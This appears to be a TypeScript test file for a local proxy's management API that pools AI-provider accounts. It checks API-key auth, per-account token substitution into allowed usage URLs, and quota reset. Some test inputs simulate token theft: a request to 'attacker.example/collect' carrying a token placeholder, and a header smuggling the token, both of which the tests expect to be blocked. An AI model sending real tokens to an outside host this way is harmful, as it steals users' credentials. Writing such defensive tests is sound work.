import test from "node:test";
import assert from "node:assert/strict";
import { ProxyServer } from "../electron/core/proxy/proxy-server";
import type { Account } from "../shared/types";

const KEY = "relay-sec-hubtestkey";
const base = { kind: "personal", group: "personal", color: "olive", createdAt: "2026-11-09T00:00:00.000Z" } as const;
const claude: Account = { ...base, id: "cl-1", name: "Vertex", auth: { loggedIn: true, email: "c@example.com", checkedAt: "2026-11-09T00:00:00.000Z" } };
const codex: Account = {
  ...base, id: "cx-1", name: "OpenAI · Codex", provider: "codex",
  auth: { loggedIn: true, email: "x@example.com", accountUuid: "chatgpt-acc-1", subscription: "Plus", checkedAt: "2026-11-09T00:00:00.000Z" },
};
const antigravity: Account = { ...base, id: "ag-1", name: "Google", provider: "antigravity", auth: { loggedIn: true, email: "g@example.com", checkedAt: "2026-11-09T00:00:00.000Z" } };
const signedOut: Account = { ...base, id: "cl-2", name: "No sign-in" };

async function hub(t: { after: (fn: () => Promise<void> | void) => void }) {
  const sent: { url: string; method?: string; headers: Record<string, string>; body?: unknown }[] = [];
  const server = new ProxyServer({
    config: { port: 0, host: "127.0.0.1", enabled: true, apiKey: KEY },
    credentialResolver: async (account) => `token-${account.id}`,
    usageProvider: () => ({ accounts: [claude, codex, antigravity, signedOut], usageMap: {} }),
    hubFetch: (async (url: string, init: RequestInit) => {
      sent.push({ url, method: init.method, headers: init.headers as Record<string, string>, body: init.body });
      return new Response(JSON.stringify({ five_hour: { utilization: 12, resets_at: null } }), { status: 200 });
    }) as typeof fetch,
  });
  const state = await server.start();
  t.after(() => server.stop());
  const call = (path: string, body?: unknown, key = KEY) =>
    fetch(`http://127.0.0.1:${state.port}/v0/management/${path}`, {
      method: body === undefined ? "GET" : "POST",
      headers: { Authorization: `Bearer ${key}`, "content-type": "application/json" },
      ...(body === undefined ? {} : { body: JSON.stringify(body) }),
    });
  return { server, sent, call };
}

test("a usage dashboard lists the pool's Claude and Codex accounts with the gateway's key", async (t) => {
  const { call } = await hub(t);
  assert.equal((await call("auth-files", undefined, "wrong-key")).status, 401);
  const response = await call("auth-files");
  assert.equal(response.status, 200);
  const { files } = (await response.json()) as { files: Record<string, unknown>[] };
  // Antigravity has no usage endpoint here, and an account without a sign-in has no token.
  assert.deepEqual(files.map((f) => [f.id, f.auth_index, f.provider, f.email, f.disabled]), [
    ["cl-1", "cl-1", "claude", "c@example.com", false],
    ["cx-1", "cx-1", "codex", "x@example.com", false],
  ]);
  assert.deepEqual(files[1].id_token, { chatgpt_account_id: "chatgpt-acc-1", plan_type: "plus" });
});

test("api-call sends the account's own token to its provider's usage request, and nothing else", async (t) => {
  const { call, sent } = await hub(t);
  const usage = await call("api-call", {
    auth_index: "cl-1",
    method: "GET",
    url: "https://api.anthropic.com/api/oauth/usage",
    header: { Authorization: "Bearer $TOKEN$", "anthropic-beta": "oauth-2025-04-20", "X-Smuggle": "$TOKEN$" },
  });
  assert.equal(usage.status, 200);
  assert.deepEqual(await usage.json(), { status_code: 200, body: JSON.stringify({ five_hour: { utilization: 12, resets_at: null } }) });
  assert.equal(sent.length, 1);
  assert.equal(sent[0].url, "https://api.anthropic.com/api/oauth/usage");
  assert.deepEqual(sent[0].headers, { Authorization: "Bearer token-cl-1", "anthropic-beta": "oauth-2025-04-20" });
  // Codex: its ChatGPT usage and reset credits, with its own token.
  const consume = await call("api-call", {
    auth_index: "cx-1",
    method: "POST",
    url: "https://chatgpt.com/backend-api/wham/rate-limit-reset-credits/consume",
    header: { Authorization: "Bearer $TOKEN$", "Chatgpt-Account-Id": "chatgpt-acc-1" },
    data: '{"credit_id":"c1"}',
  });
  assert.equal(consume.status, 200);
  assert.equal(sent[1].headers.Authorization, "Bearer token-cx-1");
  assert.equal(sent[1].body, '{"credit_id":"c1"}');
  // Any other address, another provider's address, or an unknown account: refused, nothing sent.
  for (const body of [
    { auth_index: "cl-1", url: "https://attacker.example/collect", header: { Authorization: "Bearer $TOKEN$" } },
    { auth_index: "cl-1", url: "https://chatgpt.com/backend-api/wham/usage" },
    { auth_index: "cx-1", method: "DELETE", url: "https://chatgpt.com/backend-api/wham/usage" },
    { auth_index: "ag-1", url: "https://api.anthropic.com/api/oauth/usage" },
    { auth_index: "nope", url: "https://api.anthropic.com/api/oauth/usage" },
  ])
    assert.notEqual((await call("api-call", body)).status, 200, JSON.stringify(body));
  assert.equal(sent.length, 2);
});

test("reset-quota lets the account be picked again at once", async (t) => {
  const { call, server } = await hub(t);
  server.router.markUnavailable("cx-1", 60_000);
  assert.throws(() => server.router.selectAccount(undefined, [codex], {}, "codex"));
  const response = await call("reset-quota", { auth_index: "cx-1" });
  assert.equal(response.status, 200);
  assert.equal(server.router.selectAccount(undefined, [codex], {}, "codex").account.id, "cx-1");
  assert.equal((await call("unknown-call")).status, 404);
});
